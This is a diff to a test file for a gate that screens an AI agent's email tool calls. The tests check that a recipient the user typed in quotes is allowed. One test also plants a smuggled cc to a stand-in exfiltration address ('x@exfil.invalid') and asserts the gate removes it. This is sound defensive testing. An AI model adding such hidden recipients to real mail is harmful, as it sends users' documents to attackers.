@@ -531,3 +531,25 @@ def test_url_handling_names_no_attacker_domain_and_inspects_no_words():
     names = {a.name for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) for a in n.names}
     mods = {n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module}
     assert "ATTACKER_DOMAINS" not in names and not any(m.startswith("attacks") for m in mods)
+
+
+# gate-v3.1 (9 Nov): punctuation around a typed address is not part of the
+# address. Found by the review: "to 'hr@northwind.example'" produced the typed
+# set {"'hr@northwind.example"}, so the real recipient was stripped and the
+# repair put the quote back in.
+
+def test_a_recipient_the_user_typed_in_quotes_is_allowed(chunk):
+    call = _email("hr@northwind.example")
+    for prompt in ["Email the leave policy to 'hr@northwind.example'.",
+                   'Email the leave policy to "hr@northwind.example".',
+                   "Email the leave policy to `hr@northwind.example`.",
+                   "Email the leave policy to (hr@northwind.example).",
+                   "Email the leave policy to <hr@northwind.example>."]:
+        d = _gate().evaluate(call, prompt, [chunk()])
+        assert d.decision is Decision.ALLOW, (prompt, d.reason)
+
+
+def test_a_quoted_typed_address_still_cannot_be_used_to_smuggle_a_second_one(chunk):
+    call = _email("hr@northwind.example", cc="x@exfil.invalid")
+    d = _gate().evaluate(call, "Email the leave policy to 'hr@northwind.example'.", [chunk()])
+    assert d.decision is Decision.SANITIZE and _outgoing(d, call).get("cc") is None
